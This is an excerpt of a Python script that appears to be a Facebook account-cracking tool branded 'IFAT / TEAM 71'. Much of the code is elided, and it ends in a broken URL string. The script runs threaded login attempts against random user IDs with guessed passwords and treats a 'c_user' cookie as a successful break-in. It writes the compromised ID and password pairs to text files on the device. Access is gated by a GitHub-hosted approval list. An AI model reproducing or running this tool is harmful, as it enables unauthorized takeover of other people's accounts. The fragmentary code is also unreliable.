...
print('\n\033[1;37m install modules....\n It will take some seconds...IFAT   W8 update Tool..')
...
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   : TEAM 71          │ 
\033[1;37m│ ❲★❳ GITHUB   : IFAT-123            |
\033[1;37m│ ❲★❳ WHATSAPP : +88 01623689004        │
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : IFAT-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : IFAT-RNDM-CP.txt  ")
...
def apk(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/IFAT-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
...
def mix(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/IFAT-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def approval():
  ...
  id = "4h".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Ifat53/approval/blob/main/Approval.)txt
    if id in httpCaht:
